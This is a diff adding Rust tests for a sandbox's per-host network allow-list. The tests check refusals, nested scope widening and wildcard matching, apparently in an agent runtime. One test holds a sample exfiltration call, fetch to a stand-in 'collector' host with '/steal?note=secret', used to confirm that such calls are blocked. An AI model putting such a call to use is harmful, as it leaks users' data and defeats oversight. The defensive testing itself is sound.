@@ -449,3 +449,167 @@ async fn the_person_carries_into_the_sub_execution() {
         out
     );
 }
+
+/// The destination dimension: where a narrowed turn may go, not just what it
+/// may do.
+///
+/// `use_network` names the verb and nothing else, so "may call the network"
+/// meant "may call anything" — and that is the gap a capability set cannot
+/// close on its own, because **exfiltration needs no write capability**. A
+/// planning turn holding only reads could put everything it read into a URL.
+#[tokio::test(flavor = "multi_thread")]
+async fn a_narrowed_turn_can_be_bounded_to_named_hosts() {
+    let _guard = test_mutex().lock().await;
+    setup_env().await;
+
+    let out = value(
+        "test://attenuation/hosts",
+        r#"
+        const run = sandbox.run(`
+            try {
+                fetch("https://collector.example.test/steal?note=secret");
+                "not refused";
+            } catch (e) {
+                String(e.message || e);
+            }
+        `, { capabilities: ["use_network"], hosts: ["api.example.test"] });
+        run.value
+        "#,
+    )
+    .await;
+
+    let message = out.as_str().unwrap_or_default();
+    assert!(
+        message.contains("may not reach") && message.contains("collector.example.test"),
+        "a host outside the scope should be refused by name: {}",
+        out
+    );
+    assert!(
+        message.contains("api.example.test"),
+        "the refusal should say what is allowed, since the caller wrote the list: {}",
+        out
+    );
+}
+
+/// Asking to reach somewhere the caller cannot is refused at the call.
+///
+/// The destination counterpart of `asking_for_more_than_the_caller_holds`, and
+/// refused for the same reason: a sub-execution whose requests mysteriously
+/// fail is the worse of the two ways to report a bug in the narrowing.
+#[tokio::test(flavor = "multi_thread")]
+async fn a_narrowing_cannot_widen_where_it_may_go() {
+    let _guard = test_mutex().lock().await;
+    setup_env().await;
+
+    let report = outer(
+        "test://attenuation/hosts-widen",
+        r#"
+        const inner = sandbox.run(`
+            sandbox.run("1", { capabilities: ["use_network"], hosts: ["elsewhere.example.test"] });
+        `, { capabilities: ["use_network"], hosts: ["api.example.test"] });
+        inner.error || "no error";
+        "#,
+    )
+    .await;
+
+    let value = report.outcome.value.unwrap_or_default();
+    let message = value.as_str().unwrap_or_default();
+    assert!(
+        message.contains("cannot reach") && message.contains("elsewhere.example.test"),
+        "a nested narrowing must not reach past its parent's scope: {}",
+        value
+    );
+}
+
+/// A wildcard covers subdomains and not the bare parent.
+///
+/// The rule CSP and CORS use. A list that said `*.example.test` and quietly
+/// also permitted `example.test` would be one that does not say what it looks
+/// like it says.
+#[tokio::test(flavor = "multi_thread")]
+async fn a_wildcard_covers_subdomains_and_not_the_parent() {
+    let _guard = test_mutex().lock().await;
+    setup_env().await;
+
+    let out = value(
+        "test://attenuation/hosts-wildcard",
+        r#"
+        function attempt(url) {
+            const run = sandbox.run(
+                'try { fetch(' + JSON.stringify(url) + '); "reached"; } ' +
+                'catch (e) { String(e.message || e); }',
+                { capabilities: ["use_network"], hosts: ["*.example.test"] }
+            );
+            return run.value;
+        }
+        ({
+            sub: attempt("https://api.example.test/x"),
+            parent: attempt("https://example.test/x"),
+            other: attempt("https://example.test.evil.test/x"),
+        })
+        "#,
+    )
+    .await;
+
+    // The subdomain is permitted, so it gets as far as the network and fails
+    // there — what matters is that it is not the scope that refused it.
+    assert!(
+        !out["sub"]
+            .as_str()
+            .unwrap_or_default()
+            .contains("may not reach"),
+        "a subdomain should pass the scope: {}",
+        out
+    );
+    assert!(
+        out["parent"]
+            .as_str()
+            .unwrap_or_default()
+            .contains("may not reach"),
+        "a wildcard must not admit the bare parent: {}",
+        out
+    );
+    assert!(
+        out["other"]
+            .as_str()
+            .unwrap_or_default()
+            .contains("may not reach"),
+        "a suffix that is not a subdomain must not pass: {}",
+        out
+    );
+}
+
+/// `sandbox.hosts()` answers `null` for unrestricted and a list otherwise.
+///
+/// The distinction is load-bearing: an empty array is a real answer — a turn
+/// that may reach nothing — so conflating it with "anywhere" would make
+/// `sandbox.hosts() || []` quietly open the network back up.
+#[tokio::test(flavor = "multi_thread")]
+async fn a_turn_can_read_where_it_may_go() {
+    let _guard = test_mutex().lock().await;
+    setup_env().await;
+
+    let out = value(
+        "test://attenuation/hosts-read",
+        r#"
+        const bounded = sandbox.run(
+            "JSON.stringify(sandbox.hosts())",
+            { capabilities: ["use_network"], hosts: ["api.example.test"] }
+        );
+        ({ outer: sandbox.hosts(), inner: bounded.value })
+        "#,
+    )
+    .await;
+
+    assert!(
+        out["outer"].is_null(),
+        "an ordinary turn reaches anywhere, which is null rather than []: {}",
+        out
+    );
+    assert_eq!(
+        out["inner"].as_str().unwrap_or_default(),
+        r#"["api.example.test"]"#,
+        "a bounded turn should be able to read its own scope: {}",
+        out
+    );
+}
